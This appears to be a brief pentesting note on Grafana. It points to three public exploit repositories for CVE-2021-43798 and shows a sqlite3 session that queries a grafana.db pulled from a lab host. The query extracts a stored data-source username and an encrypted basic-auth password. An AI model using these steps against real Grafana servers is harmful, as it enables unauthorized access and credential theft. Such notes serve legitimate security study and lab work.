# Grafana

{% code overflow="wrap" fullWidth="true" %}
```sql
https://github.com/taythebot/CVE-2021-43798
https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798
https://github.com/jas502n/Grafana-CVE-2021-43798

└─$ sqlite3 exploits/exploit-grafana-CVE-2021-43798/http_192_168_93_181_3000/grafana.db 
SQLite version 3.38.5 2022-05-06 15:25:27
Enter ".help" for usage hints.
sqlite> SELECT basic_auth_user, secure_json_data from data_source;
sysadmin|{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}
```
{% endcode %}
